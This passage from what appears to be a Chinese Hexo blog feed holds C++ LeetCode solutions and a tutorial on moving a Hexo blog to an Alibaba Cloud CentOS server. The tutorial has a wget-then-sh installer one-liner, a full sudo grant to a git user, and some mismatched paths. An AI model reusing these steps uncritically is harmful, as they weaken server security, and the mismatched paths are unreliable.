mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.24414em;"><span style="top:-1.75586em;margin-right:0.05em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span><span class="mclose">)</span></span></span></span>。（<s>还不会以后补过</s>）</p><p>不妨从数学角度理解(贪心)，找到盛水容器的最优解，先说结论，利用双指针扫描数组，<code>i</code>、<code>j</code>分别指向数组的首尾，若左边界的高度大于右边界，则<code>j--</code>，反之则<code>i++</code>，直到两指针相遇，每次迭代更新最大值，即可找到最优解，时间复杂度可优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>（思路较为巧妙，建议背过）</p><p>难点在于证明该做法的正误：在指针逼近的过程中，必定出现一边指针先到达最优解边界的情况，这里假设左边界先到达，此时预期最优解的边界坐标小于当前右指针<code>j</code>。利用反证法，假设左边界高度小于等于右边界高度，预期解的容水量必定小于当前，矛盾，故左边界的高度大于右边界，右指针左移，必定能得到最优解</p><p><img src="https://s2.loli.net/2023/10/25/6sUNRwkKp3c8fuy.png" alt="证明"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;<span class="comment">//保存最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=height.<span class="built_in">size</span>()<span class="number">-1</span>;i&lt;j;)<span class="comment">//双指针逼近，直到相遇</span></span><br><span class="line">        &#123;</span><br><span class="line">            res=<span class="built_in">max</span>(<span class="built_in">min</span>(height[i],height[j])*(j-i),res);<span class="comment">//迭代更新</span></span><br><span class="line">            <span class="keyword">if</span>(height[i]&lt;height[j]) i++;</span><br><span class="line">            <span class="keyword">else</span> j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="12-整数转罗马数字"><a href="https://leetcode.cn/problems/integer-to-roman/">12. 整数转罗马数字</a></h2><p>水题，因为数据量仅为1-3999，打表都能过，为了显得不那么业余，浅找一下规律</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt;I    4 -&gt;IV    5 -&gt;V    9 -&gt;IX</span><br><span class="line">10-&gt;X    40-&gt;XL    50-&gt;L    90-&gt;XC</span><br><span class="line">100-&gt;C   400-&gt;CD   500-&gt;D   900-&gt;CM</span><br><span class="line">1000-&gt;M</span><br></pre></td></tr></table></figure><p>记录一下特殊情况，若大于特殊值在后面补<code>I、X、C、M</code>即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">intToRoman</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> values[]=&#123;<span class="comment">//特殊值</span></span><br><span class="line">            <span class="number">1000</span>,</span><br><span class="line">            <span class="number">900</span>,<span class="number">500</span>,<span class="number">400</span>,<span class="number">100</span>,</span><br><span class="line">            <span class="number">90</span>,<span class="number">50</span>,<span class="number">40</span>,<span class="number">10</span>,</span><br><span class="line">            <span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span></span><br><span class="line">        &#125;;</span><br><span class="line">        string str[]=&#123;<span class="comment">//特殊值对应的罗马数字</span></span><br><span class="line">            <span class="string">&quot;M&quot;</span>,</span><br><span class="line">            <span class="string">&quot;CM&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;CD&quot;</span>,<span class="string">&quot;C&quot;</span>,</span><br><span class="line">            <span class="string">&quot;XC&quot;</span>,<span class="string">&quot;L&quot;</span>,<span class="string">&quot;XL&quot;</span>,<span class="string">&quot;X&quot;</span>,</span><br><span class="line">            <span class="string">&quot;IX&quot;</span>,<span class="string">&quot;V&quot;</span>,<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;I&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        string result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(num&gt;=values[i])</span><br><span class="line">            &#123;</span><br><span class="line">                num-=values[i];</span><br><span class="line">                result+=str[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="13-罗马数字转整数"><a href="https://leetcode.cn/problems/roman-to-integer/">13. 罗马数字转整数</a></h2><p>是上一题的逆运算，直接将各罗马数字的值相加即可，注意要特殊判断如果前面的罗马数字代表的值小于后面，要减去前面罗马数字的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; hash;</span><br><span class="line">        hash[<span class="string">&#x27;I&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        hash[<span class="string">&#x27;V&#x27;</span>]=<span class="number">5</span>;</span><br><span class="line">        hash[<span class="string">&#x27;X&#x27;</span>]=<span class="number">10</span>;</span><br><span class="line">        hash[<span class="string">&#x27;L&#x27;</span>]=<span class="number">50</span>;</span><br><span class="line">        hash[<span class="string">&#x27;C&#x27;</span>]=<span class="number">100</span>;</span><br><span class="line">        hash[<span class="string">&#x27;D&#x27;</span>]=<span class="number">500</span>;</span><br><span class="line">        hash[<span class="string">&#x27;M&#x27;</span>]=<span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">1</span>&lt;s.<span class="built_in">size</span>() &amp;&amp; hash[s[i]]&lt;hash[s[i+<span class="number">1</span>]])<span class="comment">//特殊判断</span></span><br><span class="line">                res-=hash[s[i]];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                res+=hash[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="14-最长公共前缀"><a href="https://leetcode.cn/problems/longest-common-prefix/">14. 最长公共前缀</a></h2><p>简单题，就是循环枚举每个字符串的每个字母，直到前缀超过某一字符串的长度或有字母不匹配输出结果即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        string res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!strs.<span class="built_in">size</span>()) <span class="keyword">return</span> res;<span class="comment">//若传入的字符串数组为空,直接返回</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;;i++)&#123;<span class="comment">//遍历每一个字母、</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;=strs[<span class="number">0</span>].<span class="built_in">size</span>()) <span class="keyword">return</span> res;<span class="comment">//前缀超过第一个字符串长度</span></span><br><span class="line">            <span class="type">char</span> ch=strs[<span class="number">0</span>][i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;strs.<span class="built_in">size</span>();j++)&#123;<span class="comment">//遍历每一个字符串</span></span><br><span class="line">                <span class="keyword">if</span>(i&gt;=strs[j].<span class="built_in">size</span>()||ch!=strs[j][i])<span class="comment">//若超过某一字符串长度或字符不匹配</span></span><br><span class="line">                    <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">            res+=ch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="15-三数之和"><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h2><p>双指针算法，要求数组有序所以先排序，假设指针<code>i、j、k</code>指向的值依次增大，枚举<code>i</code>的位置，<code>j、k</code>指针使用双指针算法，暴力遍历时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> ，找到第一个<code>j</code>指针位置和其对应的<code>k</code>指针，使得刚好满足<code>num[i]+num[j]+num[k]&gt;=0</code>，因为有序，<code>j</code>向前遍历，<code>k</code>指针只能向后寻找，将时间复杂度优化为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;&amp;nums[i]==nums[i<span class="number">-1</span>]) <span class="keyword">continue</span>;<span class="comment">//去除重复三元组</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>,k=nums.<span class="built_in">size</span>()<span class="number">-1</span>;j&lt;k;j++)<span class="comment">//枚举i指针位置</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;i+<span class="number">1</span>&amp;&amp;nums[j]==nums[j<span class="number">-1</span>]) <span class="keyword">continue</span>;<span class="comment">//去除重复三元组</span></span><br><span class="line">                <span class="keyword">while</span>(j&lt;k<span class="number">-1</span>&amp;&amp;nums[i]+nums[j]+nums[k<span class="number">-1</span>]&gt;=<span class="number">0</span>) k--;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]+nums[k]==<span class="number">0</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;nums[i],nums[j],nums[k]&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地hexo博客迁移至云服务器教程</title>
      <link href="/2023/09/14/aliyun/"/>
      <url>/2023/09/14/aliyun/</url>
      
        <content type="html"><![CDATA[<h1>迁移本地hexo博客至云服务器</h1><h2 id="序言">序言</h2><p>2023年了，近期终于入手一台云服务器练手，之前一直有将GitHub上的博客迁移到个人服务器的想法，一是为了加快打开速度， 二是为了缩短冗长的域名。因为网上没找到一篇特别详细的教程（有也大都是几年前发表的），就记录以下我迁移站点时踩过的坑。</p><p>虽然之前也搭建过一些靶场，但我本身对服务器配置并不是十分熟悉，每处排错令我困惑不已，但最后还是折腾出来了。这次体验也让我收获不少。作为小白练手是个不错的选择。<s>希望永远有时间和经历折腾</s></p><p>配置准备：<br>1.能在本地顺利运行的hexo博客（网上教程很多）<br>2.一台服务器（我是一核2G）<br>3.一个心仪的域名<br>4.辅助软件（Xshell）</p><blockquote><p>不知道这个网站能存活多久，没申请SSL证书，域名未备案，没搭防火墙可谓是buff拉满，因此仍将保留我的镜像站点以供访问https://byforacle.github.io/B1og/</p></blockquote><p>好好好，在写这篇的时候已经被拿下了，光速出警，令人感慨</p><p><img src="https://s2.loli.net/2023/09/14/7XHG4iKW2nesZUD.png" alt="备案"></p><p><strong>坐标9.18,搞定了域名备案和SSL证书，希望能平稳运行</strong></p><p>接下来就将开始个人站点搭建之旅</p><h2 id="本地部署">本地部署</h2><p>默认你现在已将拥有了一个至少能在本地正常运行的hexo博客，即已经安装了<code>Nodejs</code>、<code>Git</code>、<code>Hexo</code>等环境</p><p>测试方法为打开终端，跳转到你博客的根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>输入以上命令后访问本地的4000端口看到hexo界面即可  <a href="http://localhost:4000/">http://localhost:4000/</a></p><h2 id="服务器登录">服务器登录</h2><blockquote><p>我阿里云服务器的系统为CentOS  7.9 64位</p></blockquote><p>若你的系统为Ubuntu甚至Windows，命令应该有所改变</p><p>我们先用XShell远程连接阿里云服务器，若首次连接，账号密码可在阿里云控制台重置账号密码获取，主机名即公网IP，端口号默认为22，输入刚才得到的账号密码即可  <s>应该不用贴图吧😓</s></p><p>登陆后切换到root账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br></pre></td></tr></table></figure><h2 id="git账户-配置">git账户 配置</h2><p>安装 git</p><p>在终端里输入安装git</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure><p>等待一下就安装好了。中途会出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Is this ok [y/d/N]:</span><br></pre></td></tr></table></figure><p>输入 ： y 回车即可,回显<code>Complete!</code>即为安装成功</p><p>创建 git 账户并添加其权限（为以后实现自动部署到git仓库做准备）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adduser git</span><br><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure><p>使用vim工具编辑<code>/etc/sudoers</code>文件，这里简述一下本文用过的vim操作</p><p>打开文档后按<code>i</code>进入编辑模式，完成后按<code>esc</code>等待底部insert字样消失后输入<code>:wq</code>退出即可</p><p><img src="https://s2.loli.net/2023/09/14/ulxd538LZbnkP1s.png" alt="vim"></p><p>在绿色光标处添加配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git     ALL=(ALL)     ALL</span><br></pre></td></tr></table></figure><p>改回权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure><p>设置git账户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure><p>输入两次密码就设置成功了。注意，linux 下输入密码是不显示 **** 的，你直接输入，输完回车就行了。</p><p>切换至 git 用户，创建 <code>~/.ssh</code> 文件夹和 <code>~/.ssh/authorized_keys</code> 文件，并赋予相应的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br><span class="line">vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>这里需要将本地的ssh公钥复制到authorized_keys文件中，这样可以让物理机无需账号密码即可连接到我们的服务器，若你已经用SSH方法将博客部署到GitHub，可在本地<code>C:\Users\（你的用户名）\.ssh</code>路径下找到<code>id_rsa.pub</code> 文件，复制粘贴其中内容即可</p><p>接着，输入以下命令，赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /home/git/.ssh/authorized_keys</span><br><span class="line">chmod 700 /home/git/.ssh</span><br></pre></td></tr></table></figure><hr><h2 id="中间节点">中间节点</h2><p>到此处为止，可以说已经完成了一半，我们可以检验一下以上的操作有无生效，在<strong>本地</strong>Git终端中测试是否能免密登录，在电脑本地桌面，右键”Git Bash Here”，输入以下命令，其中 SERVER 填写自己的云主机 ip，执行输入 yes 后不用密码说明配置成功了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure><p>回显<code>Welcome to Alibaba Cloud Elastic Compute Service !</code>即为成功</p><hr><h2 id="创建仓库目录及相关配置">创建仓库目录及相关配置</h2><blockquote><p>注意此时创建的目录即为你站点源码存放的位置，而我们后面用到的宝塔运维面板不支持将网站源码放在Linux敏感目录下，建议谨慎选择（或可以和我选择相同目录）</p></blockquote><p>切换到root用户，在www目录下创建repo文件夹作为Git仓库目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br><span class="line">mkdir /www/repo</span><br></pre></td></tr></table></figure><p>赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 755 /www/repo</span><br></pre></td></tr></table></figure><p>接下来创建 hexo 目录作为网站根目录，并赋予权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /www/hexo</span><br><span class="line">chown -R git:git /www/hexo</span><br><span class="line">chmod -R 755 /www/hexo</span><br></pre></td></tr></table></figure><p>接下来创建一个空白的 git 仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /www/repo</span><br><span class="line">git init --bare hexo.git</span><br></pre></td></tr></table></figure><p>创建一个新的 Git 钩子，用于自动部署</p><p>在 <code>/var/repo/hexo.git </code>下，有一个自动生成的 hooks 文件夹。我们需要在里边新建一个新的钩子文件 post-receive。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /www/repo/hexo.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>进入编辑模式，写入以下shell脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">git --work-tree=/www/hexo --git-dir=/www/repo/hexo.git checkout -f</span><br></pre></td></tr></table></figure><p>修改权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /www/repo/hexo.git/hooks/post-receive</span><br><span class="line">chmod +x /www/repo/hexo.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>到这里 Git 仓库已经搭建完毕了。</p><h2 id="配置nginx环境">配置Nginx环境</h2><p>在Linux安装和配置环境一直令人头疼，为了简化操作我们使用宝塔面板</p><p>进入宝塔面板官网找到Linux CentOs版本的下载命令（若你是其他系统，找到相对应的指令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh https://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484bec</span><br></pre></td></tr></table></figure><p>中途输入”y” 回车等待一会就好了。在执行结果最后会出现地址，用户名，密码等。</p><p>在本地浏览器访问地址，即可可视化地操作远程服务器，此时可能会遇到服务器未响应的问题，这是因为阿里云服务器默认不开启8888端口，在控制台配置安全组选项中打开该端口即可。</p><p>进入面板后可一键配置所需环境，选择左边那个套件（包括Mysql、Nginx、Php等等），其实我们只需要Nginx，手动下载也可</p><p>部署完成之后，点击网站，添加站点，填写你的域名，其他的不要改。</p><p><img src="https://s2.loli.net/2023/09/14/bWfIwrCkOgHG1cU.png" alt="bt"></p><p>填写完之后提交，然后点击” 设置” &gt; ” 配置文件”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    # server_name填写你自己的域名，没有的话填ip(域名最好加上3w)</span><br><span class="line">    server_name hjxlog.com;</span><br><span class="line">    index index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">    # 这里root填写自己的网站根目录，修改为/www/hexo</span><br><span class="line">    root /www/hexo;</span><br></pre></td></tr></table></figure><p>保存，然后选择 “设置”-“网站目录”，将网站目录修改成以下，保存。</p><p><img src="https://s2.loli.net/2023/09/14/kuxwBX86sMKTOFo.png" alt="config"></p><p>回到服务器终端，重启宝塔服务，使之生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service bt restart</span><br></pre></td></tr></table></figure><h2 id="本地repo设置">本地repo设置</h2><p>进入<strong>本地</strong>电脑 hexo 博客的根目录，编辑<strong>站点配置文件 _config.yml</strong>，找到 deploy和url，修改成以下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: http://www.baoyf.com/</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br><span class="line">  </span><br><span class="line">  deploy:</span><br><span class="line">  type: &#x27;git&#x27;</span><br><span class="line">  # repo: git@github.com:Byforacle/B1og.git</span><br><span class="line">  # repo: &#x27;https://github.com/Byforacle/B1og.git&#x27;</span><br><span class="line">  repo: git@www.baoyf.com:/www/repo/hexo.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>这时候可能出现权限问题，导致部署到 git 失败。在服务器终端输入以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /var/repo/</span><br><span class="line">chown -R git:git /var/hexo/</span><br></pre></td></tr></table></figure><p>再次推送即可</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阿里云 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-PHP特性</title>
      <link href="/2023/08/21/CTFshow/CTFshow3/"/>
      <url>/2023/08/21/CTFshow/CTFshow3/</url>
      
